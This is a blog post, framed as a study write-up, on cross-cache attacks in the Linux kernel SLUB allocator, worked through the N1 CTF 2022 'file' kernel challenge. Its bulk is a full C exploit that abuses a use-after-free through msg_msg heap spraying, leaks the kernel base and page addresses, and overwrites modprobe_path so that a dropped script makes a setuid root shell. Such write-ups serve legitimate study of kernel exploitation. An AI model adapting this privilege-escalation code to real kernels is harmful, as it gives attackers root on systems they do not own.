---
title: Cross Cache Attacks
date: '2026-04-05T05:30:00+05:30'
event: Blog Post
category: Research
difficulty: Intermediate
author:
- VulnX
tags:
- pwn
- kernel
- 0-day
description: A WorkInProgress writeup for studying CrossCache attacks in the Linux
  kernel SLUB allocator.     Reference Material   SLUB  https://events.static.linu...
---
A writeup for studying Cross-Cache attacks in the Linux kernel SLUB allocator.

---

# Reference Material

## SLUB
- [https://events.static.linuxfound.org/images/stories/pdf/klf2012_kim.pdf](https://events.static.linuxfound.org/images/stories/pdf/klf2012_kim.pdf)
- [https://ruffell.nz/programming/writeups/2019/02/15/looking-at-kmalloc-and-the-slub-memory-allocator.html](https://ruffell.nz/programming/writeups/2019/02/15/looking-at-kmalloc-and-the-slub-memory-allocator.html)
- [https://blogs.oracle.com/linux/linux-slub-allocator-internals-and-debugging-1](https://blogs.oracle.com/linux/linux-slub-allocator-internals-and-debugging-1)
- [https://sam4k.com/linternals-memory-allocators-0x02/](https://sam4k.com/linternals-memory-allocators-0x02/)

## BUDDY
- [https://syst3mfailure.io/linux-page-allocator/](https://syst3mfailure.io/linux-page-allocator/)
- [https://www.geeksforgeeks.org/operating-systems/buddy-system-memory-allocation-technique/](https://www.geeksforgeeks.org/operating-systems/buddy-system-memory-allocation-technique/)

## CROSS-CACHE
- [https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html](https://u1f383.github.io/linux/2025/01/03/cross-cache-attack-cheatsheet.html)
- [https://www.usenix.org/system/files/sec23summer_79-lee-prepub.pdf](https://www.usenix.org/system/files/sec23summer_79-lee-prepub.pdf)
- [https://dl.acm.org/doi/10.1145/3719027.3765152](https://dl.acm.org/doi/10.1145/3719027.3765152)
- [https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/](https://kaligulaarmblessed.github.io/post/cross-cache-for-lazy-people/)
- [https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf](https://i.blackhat.com/Asia-24/Presentations/Asia-24-Wu-Game-of-Cross-Cache.pdf)

---

# Lab

Tested against: [Linux Kernel v6.12](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?h=v6.12).

Source files: [GitHub](https://github.com/VulnX/cross-cache).

---

# CTF Writeup Reference

For a practical example of cross-cache exploitation we will be using N1 CTF's `file` challenge.

> Description <br />
> Baidu: https://pan.baidu.com/s/1IA2CrwBvTvF3mxOhFR-MOA?pwd=Nu1L <br />
> Google: https://drive.google.com/file/d/1D74stCuWdMo5t6XlvIx5LZywHNaSdmmU/view?usp=share_link <br />
> nc 1.13.24.237 9999 <br />
> nc 43.154.94.36 9999 <br />
> Distribution: distribute.zip <br />
> Points: 1000 <br />
> Solves: 1 <br />

See [source](https://github.com/mito753/Kernel-Exploit-Dojo/tree/main/2022/N1CTF_2022/Pwn_File).

## Initial analysis

As with any kernel CTF challenge, we are provided the following three files:

- `bzImage`
- `launch.sh`
- `rootfs.cpio`

> NOTE: We can use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract a semi-unstripped kernel `vmlinux` file out of the `bzImage`. This will be very helpful.

```
$ file bzImage                                                            
bzImage: Linux kernel x86 boot executable, bzImage, version 5.18.12 (chenhaohao@ubuntu) #11 SMP PREEMPT_DYNAMIC Tue Jul 26 13:39:23 CST 2022, RO-rootFS, Normal VGA, setup size 512*30, syssize 0x9743a, jump 0x26c 0x8cd88ec0fc8cd239 instruction, protocol 2.15, from protected-mode code at offset 0x4cc 0x94b966 bytes ZST compressed, relocatable, handover offset 0x190, legacy 64-bit entry point, can be above 4G, 32-bit EFI handoff entry point, 64-bit EFI handoff entry point, EFI kexec boot support, xloadflags bit 5, max cmdline size 2047, init_size 0x302c000
```

It uses linux 5.18.12, we will need to keep [elixir bootlin](https://elixir.bootlin.com/linux/v5.18.12/source) always open :D

This is `launch.sh`:

```bash
#!/bin/bash

qemu-system-x86_64 \
    -smp 2 \
    -m 2G \
    -kernel ./bzImage \
    -initrd ./rootfs.cpio \
    -append "console=ttyS0 kaslr quiet panic=1" \
    -monitor /dev/null \
    -cpu kvm64,+smep,+smap \
    -nographic
```

I will swap out kcmdline parameters `kaslr` with `nokaslr` for easier debugging with [pwndbg](https://pwndbg.re).

If we extract the rootfs with

```shell
fakeroot cpio -idmv < ../rootfs.cpio
```

we will obtain the `init` file:

```bash
#!/bin/sh
mkdir /proc
mkdir /sys
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mkdir /dev/pts
mount -t devpts devpts /dev/pts

insmod /mod.ko
chmod 666 /dev/vuln

setsid cttyhack setuidgid 1000 /bin/sh
 

umount /proc
umount /sys
poweroff -d 0  -f
```

and obviously the main `mod.ko` file.

---

# Poc

## Full exploit

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include "kpwn/core.h"
#include "kpwn/log.h"
#include "kpwn/msg_msg.h"
#include "rootsh.h"

#define FGET 0xdead00
#define FPUT 0xdead01

/* Switches to CPU 1 for allocation of message queue */
int fetch_msq()
{
	pin_to_cpu(1);
	int ret = get_msq();
	pin_to_cpu(0);
	return ret;
}

volatile int *start_child;

void child()
{
	char *root_script = "#!/bin/sh\n"
			    "chown 0:1000 /tmp/rootsh\n"
			    "chmod +s /tmp/rootsh\n";
	char *bad_script = "\xff\xff\xff\xff";
	FILE *fp;
	fp = fopen("/tmp/a", "w");
	fwrite(root_script, strlen(root_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/b", "w");
	fwrite(bad_script, strlen(bad_script), sizeof(char), fp);
	fclose(fp);
	fp = fopen("/tmp/rootsh", "w");
	fwrite(rootsh, rootsh_len, sizeof(rootsh[0]), fp);
	fclose(fp);
	if (chmod("/tmp/a", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/a");
	if (chmod("/tmp/b", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	if (chmod("/tmp/rootsh", S_IRUSR | S_IWUSR | S_IXUSR |
	    S_IRGRP | S_IWGRP | S_IXGRP | S_IROTH | S_IWOTH | S_IXOTH) == -1)
		panic("failed to chmod /tmp/b");
	LOG_INFO("[CHILD] Created all files");
	
	while (*start_child == 0)
		;

	LOG_SUCCESS("[CHILD] Took control");
	LOG_INFO("[CHILD] Executing root script");
	execve("/tmp/b", NULL, NULL);
	LOG_INFO("[CHILD] Done. Starting root shell");
	char *args[] = {"/tmp/rootsh", "sh", NULL};
	execve(args[0], args, NULL);

	hang();
}

int main(void)
{
	pin_to_cpu(0);

	start_child = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
			   MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*start_child = 0;
	if (fork() == 0)
		child();

	LOG_INFO("Starting exploit...");
	int fd = open("/dev/vuln", O_RDONLY);
	LOG_INFO("fd = %d", fd);
	int tmp_fd[8 * 16];
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		tmp_fd[i] = open("/tmp/file", O_RDWR | O_CREAT, 0666);
	}
	int uaf_idx = 17;
	/* (unnecessarily, for us) increases refcount by 1 */
	ioctl(fd, FGET, tmp_fd[uaf_idx]);
	/* (neutralize) decreases refcount by 1 */
	ioctl(fd, FPUT);

	LOG_INFO("Freeing all tmp_fd[]");
	for (int i = 0 ; i < ARR_LEN(tmp_fd) ; i++) {
		if (i == uaf_idx) {
			ioctl(fd, FPUT); /* UAF */
			LOG_INFO("UAF object should be freed by now");
		} else {
			close(tmp_fd[i]);
		}
	}
	LOG_INFO("UAF page should be returned to buddy allocator");
	LOG_INFO("Spraying 0x100 msg_msg now");
	int primary_msq[32];
	for (int i = 0 ; i < (sizeof primary_msq / sizeof primary_msq[0]) ; i++) {
			primary_msq[i] = fetch_msq();
			sprintf(mymsg.mtext, "OLD_%d", i);
			memcpy(&mymsg.mtext[0x38 - sizeof(struct msg_msg)], "\x01", 1);
			msg_send(&mymsg, primary_msq[i], 256 - sizeof(struct msg_msg));
	}
	LOG_INFO("Done. Testing for successful cross-cache page reclaim");
	LOG_INFO("Freeing fake obj");
	ioctl(fd, FPUT);
	LOG_INFO("Spraying segmented msg_msg now (for overlap)");
	int secondary_msq[32];
	struct msg_msg fake_msg;
	fake_msg.m_list.next = 0, /* cannot use */
	fake_msg.m_list.prev = 0,
	fake_msg.m_type = 1,
	fake_msg.m_ts = 0x1000,
	fake_msg.next = 0, /* can be used for arb read */
	fake_msg.security = 0,
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		/* LOG_INFO("new_msg_id[%d] = %d", i, new_msg_id[i]); */
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	int idx = -1;
	int next_idx = -1;
	for (int i = 0 ; i < ARR_LEN(primary_msq) && idx == -1 ; i++) {
		msg_recv(&mymsg, primary_msq[i], sizeof(mymsg.mtext), MSG_COPY);
		int res;
		for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
			if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
				idx = i;
				next_idx = res;
				break;
			}
		}
	}
	if (idx == -1 || next_idx == -1)
		panic("failed to find leak");	

	LOG_SUCCESS("Cross-cache reclaim successful");
	LOG_INFO("idx=%d, next_idx=%d", idx, next_idx);

	LOG_INFO("Sending 2nd msg in primary_msq[next_idx]");
	msg_send(&mymsg, primary_msq[next_idx], 512 - sizeof(struct msg_msg));
	LOG_INFO("Spraying pipe buffer now");
	int pipefd[8][2];
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		if (pipe(pipefd[i]) == -1)
			panic("failed to create pipe");
		/*
		 * 8 * PAGE_SIZE = 8 * object allocation = 8 * 0x40 sized ring buffer
		 * => ring buffer goes in kmalloc_cg_512
		 */
		if (fcntl(pipefd[i][0], F_SETPIPE_SZ, 8 * PAGE_SIZE) == -1)
			panic("failed to set pipe size");
		write(pipefd[i][1], "AAAABBBB", 8); /* populate pipe_buffer */
	}

	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	uint64_t kmalloc_cg_512_addr = -1;
	for (int j = 0x100 ; j < 0x1000 ; j += 0x100) {
		int res;
		if (sscanf(&mymsg.mtext[j], "OLD_%d", &res) == 1) {
			if (res != next_idx) {
				LOG_INFO("[IGNORE] Found msq_id: %d (Expected: %d)", res, next_idx);
				continue;
			}
			kmalloc_cg_512_addr = *(uint64_t *)&mymsg.mtext[j - 0x30];
		}
	}
	if (kmalloc_cg_512_addr == -1)
		panic("failed to find kmalloc_cg_512 addr");
	LOG_INFO("kmalloc_cg_512 = %#lx", kmalloc_cg_512_addr);

	// Free UAF object (primary_msq[idx]) via FPUT
	ioctl(fd, FPUT);

	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = kmalloc_cg_512
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			PAGE_SIZE - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)kmalloc_cg_512_addr + sizeof(struct msg_msg) - 8;
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	// Leak whole page => you get kASLR leak
	LOG_INFO("Leaking kmalloc_cg_512 page for kASLR leak");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	UPDATE_KBASE(-1);
	uint64_t pipe_buffer_page;
	for (int i = PAGE_SIZE - sizeof(struct msg_msg) + 0x10 ;
	     i < sizeof(mymsg.mtext) ;
	     i += 0x10) {
		uint64_t addr = *(uint64_t *)&mymsg.mtext[i];
		if ((addr & 0xfff) == 0xc40) {
			UPDATE_KBASE(addr - 0x1242c40);
			pipe_buffer_page = *(uint64_t *)&mymsg.mtext[i - 0x10];
		}
	}
	if (KBASE == -1)
		panic("failed to find kbase");
	LOG_SUCCESS("KBASE @ %#lx", KBASE);
	LOG_INFO("pipe_buffer page @ %#lx", pipe_buffer_page);

	// Free UAF object (primary_msq[idx]) via FPUT
	ioctl(fd, FPUT);

	uint64_t base_offset_ptrs = KBASE_OFFSET(0x16d7ff8);
	// Reclaim with msg_msgseg and overwrite fake msg_msg->next = base_offset_ptrs
	LOG_INFO("Reclaim UAF object with msg_msgseg");
	fake_msg.m_list.next = 0; /* unused */
	fake_msg.m_list.prev = 0;
	fake_msg.m_type = 1;
	fake_msg.m_ts = PAGE_SIZE - sizeof(struct msg_msg) +
			0x100 - sizeof(struct msg_msgseg);
	fake_msg.next = (void *)base_offset_ptrs; /* can be used for arb read */
	fake_msg.security = 0;
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)],
	       (char *)&fake_msg + 8, sizeof(fake_msg) - 8);
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Leaking base_offset_ptrs for vmemmap_base & page_base_offset");
	msg_recv(&mymsg, primary_msq[idx], sizeof(mymsg.mtext), MSG_COPY);
	dump(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg)], 0x20);
	int vmemmap_base_index = PAGE_SIZE - sizeof(struct msg_msg);
	int page_offset_base_index = PAGE_SIZE - sizeof(struct msg_msg) + 0x10;
	uint64_t vmemmap_base = *(uint64_t *)&mymsg.mtext[vmemmap_base_index];
	uint64_t page_base_offset = *(uint64_t *)&mymsg.mtext[page_offset_base_index];
	LOG_SUCCESS("vmemmap_base @ %#lx", vmemmap_base);
	LOG_SUCCESS("page_base_offset @ %#lx", page_base_offset);

	/* sizeof(struct page) = 0x40 */
	int pfn = (pipe_buffer_page - vmemmap_base) / 0x40;
	LOG_INFO("pfn = %#x", pfn);
	uint64_t page_addr = page_base_offset + pfn * PAGE_SIZE;
	LOG_INFO("physical address = %#lx", page_addr);

	LOG_INFO("Write pivot_gadget to pipe_buffer->page");
	uint64_t overwrite_gadget = KBASE_OFFSET(0x6a1040);
	for (int i = 0 ; i < ARR_LEN(pipefd) ; i++) {
		write(pipefd[i][1], &overwrite_gadget, sizeof(overwrite_gadget));
	}

	// Free UAF object (primary_msq[idx]) via FPUT
	ioctl(fd, FPUT);

	uint64_t modprobe_path = KBASE_OFFSET(0x188b200);
	// Reclaim with msg_msgseg and overwrite filp->ops = fake_ops
	LOG_INFO("Reclaim UAF obj with msg_msgseg");
	/*
	 * Offset of overwrite_gadget in page: +8
	 * Offset of f_op->unlocked_ioctl(): +0x50
	 */
	uint64_t fake_ops_addr = page_addr + 8 - 0x50;
	memset(mymsg.mtext, '\0', sizeof(mymsg.mtext));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x28 - sizeof(struct msg_msgseg)], &fake_ops_addr, sizeof(fake_ops_addr));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Overwriting modprobe_path with \"/t\" [1/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x742f, modprobe_path) == -1)
		panic("ioctl failed");

	ioctl(fd, FPUT);

	// Reclaim with msg_msgseg and overwrite filp->ops = fake_ops
	LOG_INFO("Reclaim UAF obj with msg_msgseg");
	memset(mymsg.mtext, '\0', sizeof(mymsg.mtext));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x28 - sizeof(struct msg_msgseg)], &fake_ops_addr, sizeof(fake_ops_addr));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Overwriting modprobe_path with \"/tmp\" [2/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x706d, modprobe_path+2) == -1)
		panic("ioctl failed");

	ioctl(fd, FPUT);

	// Reclaim with msg_msgseg and overwrite filp->ops = fake_ops
	LOG_INFO("Reclaim UAF obj with msg_msgseg");
	memset(mymsg.mtext, '\0', sizeof(mymsg.mtext));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x28 - sizeof(struct msg_msgseg)], &fake_ops_addr, sizeof(fake_ops_addr));
	memcpy(&mymsg.mtext[PAGE_SIZE - sizeof(struct msg_msg) +
	       0x38 - sizeof(struct msg_msgseg)], "\x01", 1);
	for (int i = 0 ; i < (sizeof secondary_msq / sizeof secondary_msq[0]) ; i++) {
		secondary_msq[i] = fetch_msq();
		msg_send(&mymsg, secondary_msq[i], PAGE_SIZE - sizeof(struct msg_msg) +
			 256 - sizeof(struct msg_msgseg));
	}

	LOG_INFO("Overwriting modprobe_path with \"/tmp/a\" [3/3]");
	if (ioctl(tmp_fd[uaf_idx], 0x612f, modprobe_path+4) == -1)
		panic("ioctl failed");

	LOG_SUCCESS("Exploit done. modprobe_path overwritten");
	LOG_INFO("Handling control to child");
	*start_child = 1;

	hang();
}
```

## Demo

[![asciicast](https://asciinema.org/a/fo7bbbABXCppO4gj.svg)](https://asciinema.org/a/fo7bbbABXCppO4gj)